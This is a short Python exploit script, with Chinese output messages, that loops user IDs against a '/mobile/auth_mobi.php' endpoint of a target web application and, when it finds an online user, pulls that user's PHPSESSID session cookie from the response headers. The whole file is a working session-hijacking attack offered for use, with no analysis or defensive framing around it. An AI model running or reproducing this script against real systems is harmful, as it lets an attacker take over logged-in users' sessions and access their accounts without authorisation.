import requests
from bs4 import BeautifulSoup
import sys
import re

url = sys.argv[1]
for i in range(1,10000):
    try :
        vuln_url = url + "/mobile/auth_mobi.php?isAvatar=1&uid="+str(i)+"&P_VER=0"
        resp = requests.get(vuln_url)
        soup = BeautifulSoup(resp.text,'html.parser')
    
        if 'RELOGIN' in soup.get_text():
            print("不存在")
        else:
            PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(resp.headers))
            print('uid='+str(i)+"在线"+"对应的COOKIE值是：PHPSESSID="+str(PHPSESSION[0]))
            break
    except:
        break
